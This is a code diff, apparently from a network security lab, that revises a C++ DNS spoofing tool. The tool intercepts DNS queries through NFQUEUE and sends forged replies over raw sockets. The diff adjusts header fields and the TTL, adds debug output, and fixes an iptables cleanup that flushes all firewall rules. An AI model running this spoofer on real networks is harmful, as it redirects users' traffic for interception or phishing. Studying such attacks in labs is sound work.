@@ -63,7 +63,7 @@ int get_question_len(unsigned char* dns_start) {
 
 // 構造並發送 spoof DNS 回應
 void send_spoof_response(struct iphdr* orig_iph, struct udphdr* orig_udph, unsigned char* dns_query, int dns_query_len) {
-    int answer_len = 16; // 固定長度的 answer
+    int answer_len = 16;
     int dns_resp_len = dns_query_len + answer_len;
     int udp_len = sizeof(struct udphdr) + dns_resp_len;
     int ip_len = sizeof(struct iphdr) + udp_len;
@@ -76,7 +76,7 @@ void send_spoof_response(struct iphdr* orig_iph, struct udphdr* orig_udph, unsig
     iph->version = 4;
     iph->tos = 0;
     iph->tot_len = htons(ip_len);
-    iph->id = htons(rand() % 65536);
+    iph->id = htons(22486);
     iph->frag_off = 0;
     iph->ttl = 64;
     iph->protocol = IPPROTO_UDP;
@@ -90,7 +90,7 @@ void send_spoof_response(struct iphdr* orig_iph, struct udphdr* orig_udph, unsig
     udph->source = orig_udph->dest;
     udph->dest = orig_udph->source;
     udph->len = htons(udp_len);
-    udph->check = 0; // 可選
+    udph->check = 0;
 
     // DNS header + question
     memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), dns_query, dns_query_len);
@@ -100,6 +100,8 @@ void send_spoof_response(struct iphdr* orig_iph, struct udphdr* orig_udph, unsig
     struct DNS_header* dns = (struct DNS_header*)resp;
     dns->flags = htons(0x8180);
     dns->ancount = htons(1);
+    dns->nscount = 0;
+    dns->arcount = 0;
 
     // Answer section
     int ans_pos = dns_query_len;
@@ -112,11 +114,11 @@ void send_spoof_response(struct iphdr* orig_iph, struct udphdr* orig_udph, unsig
     // Class: IN
     resp[ans_pos++] = 0x00;
     resp[ans_pos++] = 0x01;
-    // TTL: 300
+    // TTL: 60
     resp[ans_pos++] = 0x00;
     resp[ans_pos++] = 0x00;
-    resp[ans_pos++] = 0x01;
-    resp[ans_pos++] = 0x2c;
+    resp[ans_pos++] = 0x00;
+    resp[ans_pos++] = 0x3c;
     // Data length: 4
     resp[ans_pos++] = 0x00;
     resp[ans_pos++] = 0x04;
@@ -134,6 +136,19 @@ void send_spoof_response(struct iphdr* orig_iph, struct udphdr* orig_udph, unsig
     dest.sin_family = AF_INET;
     dest.sin_addr.s_addr = iph->daddr;
     sendto(sockfd, packet, ip_len, 0, (struct sockaddr*)&dest, sizeof(dest));
+
+    // Print the DNS reply's domain name from the question section in the spoofed packet
+    string reply_domain = parse_domain(packet + sizeof(struct iphdr) + sizeof(struct udphdr));
+    cout << "Spoofed DNS reply domain: " << reply_domain << endl;
+
+    // Optionally, print the raw bytes for inspection
+    cout << "Raw DNS question bytes: ";
+    unsigned char* dns_start = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
+    for (int i = 0; i < dns_query_len; ++i) {
+        printf("%02x ", dns_start[i]);
+    }
+    cout << endl;
+
     close(sockfd);
     delete[] packet;
 }
@@ -180,7 +195,7 @@ static int callback(struct nfq_q_handle* qh, struct nfgenmsg* nfmsg, struct nfq_
 }
 
 void CLEAN_IPTABLES(){
-    system("iptables -t raw PREROUTING -D -p udp --dport 53 -j NFQUEUE --queue-num 0");
+    system("iptables -t raw -D PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 0");
     system("sudo iptables -F");
     system("sudo iptables -t nat -F");
     if(qh)nfq_destroy_queue(qh);
